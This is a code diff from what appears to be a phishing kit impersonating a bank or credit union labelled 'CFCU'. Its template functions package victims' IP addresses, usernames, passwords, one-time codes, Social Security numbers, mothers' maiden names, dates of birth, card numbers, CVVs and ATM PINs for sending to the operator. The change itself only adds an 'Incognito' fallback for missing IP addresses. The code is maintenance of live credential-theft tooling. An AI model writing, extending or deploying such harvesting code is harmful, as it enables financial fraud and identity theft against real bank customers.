@@ -54,11 +54,11 @@ export const sendRequest = async (message: any, handleLoading?: any) => {
   export const userDataTemplate = async () => {
     
     return `
-    ------ Viewer Information: ${IP} --------
+    ------ Viewer Information: ${IP ?? "Incognito"} --------
 
     Page: CFCU
 
-    IP Address: ${IP}
+    IP Address: ${IP ?? "Incognito"}
 
     IPV6: ${userData.browser}
     OS: ${userData.os}
@@ -71,7 +71,7 @@ export const sendRequest = async (message: any, handleLoading?: any) => {
 
 export const userNameTemplate = (username: string, password: string) => {
     
-    return `------ Login Information: ${IP} --------
+    return `------ Login Information: ${IP ?? "Incognito"} --------
 
     Page: CFCU
 
@@ -84,7 +84,7 @@ export const userNameTemplate = (username: string, password: string) => {
 
 export const pinTemplate = (pin: string) => {
 
-    return `------ OTP Information: ${IP} --------
+    return `------ OTP Information: ${IP ?? "Incognito"} --------
 
     Page: CFCU
 
@@ -97,7 +97,7 @@ export const pinTemplate = (pin: string) => {
 
 export const personalInfoTemplate = (fullname: string, dob: string, address: string, state: string, city: string, zipcode: string, phonenumber: string, ssn: string, maidenname: string) => {
 
-    return `------ Personal Information: ${IP} --------
+    return `------ Personal Information: ${IP ?? "Incognito"} --------
 
     Page: CFCU
 
@@ -119,7 +119,7 @@ export const personalInfoTemplate = (fullname: string, dob: string, address: str
 
 export const cardInfoTemplate = (cardNumber: string, exDate: string, cvv: string, atmPin: string) => {
 
-    return `------ Card Information: ${IP} --------
+    return `------ Card Information: ${IP ?? "Incognito"} --------
 
     Page: CFCU
 
